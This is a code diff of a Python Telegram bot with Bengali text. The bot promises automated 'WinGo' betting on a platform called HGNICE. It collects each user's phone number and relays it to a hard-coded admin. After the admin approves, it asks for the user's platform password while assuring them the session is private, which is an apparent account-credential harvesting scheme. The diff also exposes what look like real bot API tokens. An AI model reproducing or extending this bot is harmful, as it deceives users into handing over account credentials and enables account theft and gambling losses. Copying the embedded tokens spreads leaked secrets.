@@ -11,9 +11,9 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# ⚠️ এখানে আপনার আসল BOT_TOKEN এবং আপনার আসল TELEGRAM ID দিন
-BOT_TOKEN = "8453816911:AAH9yuZUXW1WeFGUVTHOTxPLc084G7vzfF0"
-ADMIN_ID = 8164888241  # আপনার নিজের আসল আইডি এখানে বসান
+# ⚠️ আপনার নতুন বটের API TOKEN নিচে বসান
+BOT_TOKEN = "8918135716:AAE3eWggIIlA5NV9dlG7ZQr8Wx4Nxip65o4"
+ADMIN_ID = 8164888241  # আপনার টেলিগ্রাম আইডি
 
 user_states = {}
 
@@ -75,7 +75,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     username = update.effective_user.username or "No Username"
-    name = update.effective_user.first_name
+    name = update.effective_user.first_name or "User"
     state = get_state(uid)
     text = update.message.text.strip()
 
@@ -89,11 +89,11 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
 
         admin_text = (
-            "🔔 **NEW LOGIN REQUEST!**\n\n"
+            "🔔 NEW LOGIN REQUEST!\n\n"
             f"👤 Name: {name}\n"
-            f"🆔 User ID: `{uid}`\n"
+            f"🆔 User ID: {uid}\n"
             f"🔗 Username: @{username}\n"
-            f"📱 Phone: `{text}`"
+            f"📱 Phone: {text}"
         )
         admin_keyboard = [[
             InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{uid}")
@@ -103,13 +103,11 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             await ctx.bot.send_message(
                 chat_id=ADMIN_ID,
                 text=admin_text,
-                parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup(admin_keyboard)
             )
-            print("Successfully sent message to admin!")
         except Exception as e:
-            print(f"Error sending message to admin: {e}")
-            await update.message.reply_text("⚠️ অ্যাডমিন নোটিফিকেশন পাঠাতে সমস্যা হয়েছে! অ্যাডমিন বটটি স্টার্ট করেছে কি না চেক করুন।")
+            print(f"Failed to send message to admin: {e}")
+            await update.message.reply_text("⚠️ অ্যাডমিনকে মেসেজ পাঠানো যায়নি! নিশ্চিত করুন অ্যাডমিন আইডি থেকে বটটি একবার /start করা হয়েছে।")
         return
 
     # ২. অ্যাডমিন অ্যাপ্রুভ করার পর ইউজার যখন পাসওয়ার্ড দেবে
@@ -129,8 +127,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ],
         ]
         await update.message.reply_text(
-            "✅ *পাসওয়ার্ড সফলভাবে গৃহিত হয়েছে এবং একাউন্ট যুক্ত হয়েছে!*\n\n🎯 গেম সিলেক্ট করুন:",
-            parse_mode="Markdown",
+            "✅ পাসওয়ার্ড সফলভাবে গৃহিত হয়েছে এবং একাউন্ট যুক্ত হয়েছে!\n\n🎯 গেম সিলেক্ট করুন:",
             reply_markup=InlineKeyboardMarkup(keyboard),
         )
         return
@@ -149,7 +146,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 )
             except:
                 await update.message.reply_text(
-                    "❌ ভুল ফরম্যাট! 10,20,40,80,160 এভাবে লিখুন", parse_mode="Markdown"
+                    "❌ ভুল ফরম্যাট! 10,20,40,80,160 এভাবে লিখুন"
                 )
             return
 
@@ -162,8 +159,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 state["profit"] = 0
                 state["running"] = True
                 await update.message.reply_text(
-                    f"🚀 *AUTO BETTING STARTED!*\n🎯 Target: *{tgt}*\n⏳ অপেক্ষা করুন...",
-                    parse_mode="Markdown",
+                    f"🚀 AUTO BETTING STARTED!\n🎯 Target: {tgt}\n⏳ অপেক্ষা করুন...",
                 )
                 if state.get("task"):
                     state["task"].cancel()
@@ -183,14 +179,14 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         state["awaiting"] = "phone"
         login_text = (
             "╔═══════════════════════════════╗\n"
-            "║        🔐 **ACCOUNT LOGIN** 🔐        ║\n"
+            "║        🔐 ACCOUNT LOGIN 🔐        ║\n"
             "╚═══════════════════════════════╝\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
             "📱 Enter your HGNICE phone number:\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "_Everyone uses their own account — your session is private._"
+            "Everyone uses their own account — your session is private."
         )
-        await query.message.reply_text(login_text, parse_mode="Markdown")
+        await query.message.reply_text(login_text)
 
     elif data.startswith("approve_"):
         target_uid = int(data.split("_")[1])
@@ -198,15 +194,14 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         target_state["awaiting"] = "waiting_password"
 
         try:
-            await query.edit_message_text(f"{query.message.text}\n\n✅ **APPROVED!**")
+            await query.edit_message_text(f"{query.message.text}\n\n✅ APPROVED!")
         except:
             pass
 
         try:
             await ctx.bot.send_message(
                 chat_id=target_uid,
-                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n\n🔑 এখন আপনার প্ল্যাটফর্মের পাসওয়ার্ডটি দিন:",
-                parse_mode="Markdown",
+                text="✅ ADMIN APPROVED YOUR ACCOUNT!\n\n🔑 এখন আপনার প্ল্যাটফর্মের পাসওয়ার্ডটি দিন:",
             )
         except Exception as e:
             print(f"User notify error: {e}")
@@ -219,13 +214,12 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         state["game"] = mode
         state["awaiting"] = "steps"
         await query.edit_message_text(
-            f"🎮 *WinGo {mode.upper()} SELECTED*\n\n"
-            f"💰 *BET STEPS* লিখুন:\n_Example: 10,20,40,80,160_",
-            parse_mode="Markdown",
+            f"🎮 WinGo {mode.upper()} SELECTED\n\n"
+            f"💰 BET STEPS লিখুন:\nExample: 10,20,40,80,160",
         )
 
 def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    if not BOT_TOKEN or BOT_TOKEN == "YOUR_NEW_BOT_TOKEN_HERE":
         print("Error: সঠিক BOT_TOKEN বসান!")
         return
 
